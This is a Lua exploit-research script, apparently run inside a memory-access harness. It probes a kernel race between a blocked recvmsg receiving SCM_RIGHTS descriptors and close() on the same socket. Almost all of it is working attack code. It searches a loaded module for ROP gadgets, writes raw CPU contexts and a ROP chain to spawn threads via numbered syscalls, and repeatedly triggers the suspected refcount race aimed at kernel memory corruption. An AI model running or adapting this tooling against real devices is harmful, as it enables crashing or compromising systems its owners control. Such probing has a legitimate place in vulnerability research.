-- CRASH_CLASS: HIGH
-- PROBE 971b: a child blocked in recvmsg while the socket is closed underneath it
--
-- 108a proved a descriptor passes intact over a socketpair. The receive path
-- (unp_internalize) installs the passed descriptor into the receiving process's
-- file table; running that concurrently with close() of the socket it is reading
-- from is the classic refcount shape, and nobody has run it here.

print("=== PROBE 971b: BLOCKED recvmsg vs CLOSE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function show(tag, ok, rv)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return end
    local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l))
end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

local info=memory.alloc(0x200) for i=0,0x1FC,4 do wd(info+i,0) end wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local base=rd(info+0x10C)*4294967296+rd(info+0x108)
local size=rd(info+0x110)
local function find_pat(pat)
    local off=0
    while off<size do
        local want=size-off if want>0x1000 then want=0x1000 end
        local o,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not o or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true) if i then return base+off+i-1 end
        off=off+want
    end
end
local fn=to_num(syscall.pipe.fn_addr)
local pop_rax=find_pat(string.char(0x58,0xC3))
local store_rsi=find_pat(string.char(0x48,0x89,0x06,0xC3))
print(string.format("[0] pid=%s base=0x%X pop_rax=0x%X store_rsi=0x%X", tostring(to_num(mk(20)())), base, pop_rax or 0, store_rsi or 0))

local C={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,
         RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local PAGE=0x4000
local function spawn3(sysno,a1,a2,a3)
    local block=memory.alloc(PAGE*2)
    for i=0,PAGE*2-4,4 do wd(block+i,0) end
    local ctx=memory.alloc(0x200) for i=0,0x1FC,4 do wd(ctx+i,0) end
    wd(ctx+C.MAGIC,0x480) wd(ctx+C.TYPE,0x10000) wd(ctx+C.CS,0x43) wd(ctx+C.SS,0x3b)
    wq(ctx+C.RIP,uint64(fn)) wq(ctx+C.RSP,uint64(block+PAGE*2-0x200))
    wq(ctx+C.RDI,uint64(a1)) wq(ctx+C.RSI,uint64(a2)) wq(ctx+C.RDX,uint64(a3)) wq(ctx+C.RAX,uint64(sysno))
    local ch=block+PAGE*2-0x200
    if store_rsi then wq(ch,uint64(store_rsi)) wq(ch+8,uint64(pop_rax)) wq(ch+16,uint64(431)) wq(ch+24,uint64(fn))
    else wq(ch,uint64(pop_rax)) wq(ch+8,uint64(431)) wq(ch+16,uint64(fn)) end
    return mk(430)(uint64(ctx))
end

local rounds, ok_rounds = 10, 0
for r=1,rounds do
    local sv=memory.alloc(8) wd(sv,0) wd(sv+4,0)
    mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
    local f0,f1=rd(sv),rd(sv+4)
    -- send fd0 to fd1 with SCM_RIGHTS
    local cmsg=memory.alloc(0x30)
    for i=0,0x2C,4 do wd(cmsg+i,0) end
    wd(cmsg+0,20) wd(cmsg+4,0xFFFF) wd(cmsg+8,1) wd(cmsg+16,f0)  -- CMSG_LEN(4), SOL_SOCKET, SCM_RIGHTS
    local iov=memory.alloc(0x10)
    local data=memory.alloc(8) wd(data,0x41414141)
    wq(iov,uint64(addr(data))) wq(iov+8,uint64(4))
    local msg=memory.alloc(0x30)
    for i=0,0x2C,4 do wd(msg+i,0) end
    wq(msg+16,uint64(addr(iov))) wd(msg+24,1)
    wq(msg+32,uint64(addr(cmsg))) wd(msg+40,24)  -- CMSG_SPACE(4)
    -- no data is queued: the child blocks inside recvmsg, then the socket is closed
    -- child receives, parent closes the receiving socket underneath
    local rmsg=memory.alloc(0x30)
    for i=0,0x2C,4 do wd(rmsg+i,0) end
    local riov=memory.alloc(0x10)
    local rdata=memory.alloc(0x40)
    wq(riov,uint64(addr(rdata))) wq(riov+8,uint64(4))
    local rcmsg=memory.alloc(0x40)
    for i=0,0x3C,4 do wd(rcmsg+i,0) end
    wq(rmsg+16,uint64(addr(riov))) wd(rmsg+24,1)
    wq(rmsg+32,uint64(addr(rcmsg))) wd(rmsg+40,0x40)
    local ok2,rv2=pcall(function() return spawn3(27, f1, addr(rmsg), 0) end)
    mk(240)(uint64(0),uint64(2000000))
    local okc,rvc=pcall(function() return mk(6)(uint64(f1)) end)
    mk(240)(uint64(0),uint64(2000000))
    local got=rd(rcmsg+40)
    if ok2 and rv2 and to_num(rv2)==0 then ok_rounds=ok_rounds+1 end
    print(string.format("  [r%d] fds=%d,%d child_ret=0x%08X ctrl_len=%d close=%s", r, f0, f1, rd(rmsg), got, tostring(okc and to_num(rvc)==0 or false)))
end
print(string.format("[Z] alive pid=%s rounds=%d", tostring(to_num(mk(20)())), ok_rounds))
print("=== COMPLETE ===")
